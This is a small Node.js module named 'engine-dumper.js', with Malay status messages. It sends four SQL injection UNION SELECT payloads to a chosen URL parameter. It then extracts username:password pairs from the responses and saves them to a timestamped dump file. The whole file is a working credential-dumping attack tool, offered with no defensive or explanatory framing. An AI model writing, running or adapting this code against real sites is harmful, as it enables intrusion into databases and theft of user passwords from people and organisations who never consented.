// engine-dumper.js

 const axios = require('axios');
 const fs = require('fs');

async function runDumper(targetUrl, field) {
  const result = [];
  const payloads = [
    `'+UNION+SELECT+username,0x3a,password+FROM+users--`,
    `"+UNION+SELECT+username,0x3a,password+FROM+users--`,
    `'+UNION+SELECT+concat(username,0x3a,password),null+FROM+users--`,
    `"+UNION+SELECT+concat(username,0x3a,password),null+FROM+users--`
  ];

  for (const p of payloads) {
    try {
      const url = `${targetUrl}?${field}=${encodeURIComponent(p)}`;
      const res = await axios.get(url);
      if (res.data && res.data.includes(':')) {
        const matched = res.data.match(/[\w.-]+:[\w!@#$%^&*().-]+/g);
        if (matched) {
          result.push(...matched);
        }
      }
    } catch (err) {
      result.push(`[x] Gagal akses: ${err.message}`);
    }
  }

  if (result.length > 0) {
    const filename = `output/dump-${Date.now()}.txt`;
    fs.writeFileSync(filename, result.join('\n'));
    result.unshift(`\n💾 Dump berjaya disimpan: ${filename}`);
  } else {
    result.push('❌ Tiada data sensitif dijumpai dalam cubaan dump.');
  }

  return result;
}

module.exports = runDumper;